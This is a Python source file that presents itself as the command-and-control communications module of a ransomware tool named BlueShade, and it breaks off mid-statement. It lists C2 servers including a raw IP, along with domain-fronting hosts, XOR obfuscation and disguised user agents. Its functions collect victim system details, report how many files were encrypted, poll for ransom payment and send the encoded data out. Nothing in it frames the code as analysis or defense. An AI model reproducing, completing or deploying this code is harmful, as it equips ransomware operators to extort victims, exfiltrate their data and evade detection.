#!/usr/bin/env python3
# comms.py - Command & Control communications for BlueShade
# Handles data exfiltration, C2 communication, and status reporting
# Uses domain fronting and other evasion techniques to avoid detection

import os
import sys
import json
import time
import random
import base64
import platform
import subprocess
import socket
import requests
from datetime import datetime
from urllib.parse import urlencode

# Actual C2 servers - these get rotated every few weeks
# Format: (domain, endpoint, port)
C2_SERVERS = [
    ("bluecontrol.stats-service[.]xyz", "/api/v2/metrics", 443),
    ("185.212.47.39", "/gate.php", 80),
    ("cdn-metrics.cloud-cdn[.]icu", "/collect", 443)
]

# Legitimate domains for domain fronting
FRONTING_DOMAINS = [
    "ajax.googleapis.com",
    "cdnjs.cloudflare.com",
    "fonts.googleapis.com"
]

# Encryption key for C2 comms - simple obfuscation
XOR_KEY = b"\x48\x3D\x71\xA2\x59\xC4\xB3"

# User agent to blend in with normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
]

def xor_encrypt(data, key=XOR_KEY):
    """Simple XOR encryption for C2 communications"""
    if isinstance(data, str):
        data = data.encode()
        
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % len(key)]
        
    return bytes(result)

def gather_system_info():
    """Collect basic system information for reporting"""
    info = {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "username": os.getlogin(),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Get IP address
    try:
        # Connect to external service to get real IP, not local
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["internal_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["internal_ip"] = "Unknown"
    
    # Check for domain
    try:
        if os.name == 'nt':
            domain = subprocess.check_output(["whoami", "/fqdn"], text=True).strip()
            info["domain"] = domain
    except:
        info["domain"] = "None"
        
    # Get available disk space
    try:
        if os.name == 'nt':
            drive = "C:\\"
        else:
            drive = "/"
            
        total, used, free = shutil.disk_usage(drive)
        info["disk_total_gb"] = round(total / (1024**3), 2)
        info["disk_free_gb"] = round(free / (1024**3), 2)
    except:
        info["disk_total_gb"] = 0
        info["disk_free_gb"] = 0
    
    return info

def establish_connection(campaign_id):
    """Establish initial connection to C2 server"""
    system_info = gather_system_info()
    system_info["campaign_id"] = campaign_id
    system_info["stage"] = "init"
    
    return send_data(system_info)

def report_status(campaign_id, encrypted_count):
    """Report encryption status back to C2"""
    data = {
        "campaign_id": campaign_id,
        "stage": "encrypted",
        "count": encrypted_count,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname()
    }
    
    return send_data(data)

def check_for_payment(campaign_id):
    """Check if ransom has been paid - called by decryptor"""
    data = {
        "campaign_id": campaign_id,
        "stage": "payment_check",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    response = send_data(data, expect_response=True)
    if not response:
        return False
        
    try:
        payment_status = json.loads(response).get("paid", False)
        return payment_status
    except:
        return False

def send_data(data, expect_response=False):
    """Send data to the C2 server using evasion techniques"""
    # Convert data to JSON
    json_data = json.dumps(data)
    
    # Encode and encrypt the data
    encrypted_data = xor_encrypt(json_data)
    encoded_data = base64.b64encode(encrypted_data).decode()
    
    # Add some random junk to look like regular form submission
    post_data = {
        "data": encoded_data,
        "t": int(time.time()),
        "v": "1.3.4",
        "sid": ''.join(random.choices('0123456789abcdef', k=16))
    }
    
    # Convert to URL encoded form data
    form_data = urlencode(post_data)
    
    # Prepare headers with domain fronting
    user_agent = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": user_agent,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*"
    }
    
    # Try each C2 server until one works
    for domain, endpoint, port in C2_SERVERS:
        try:
            # Use domain fronting when on HTTPS
            if port == 443:
                headers["Host"] = domain
                actual_domain =
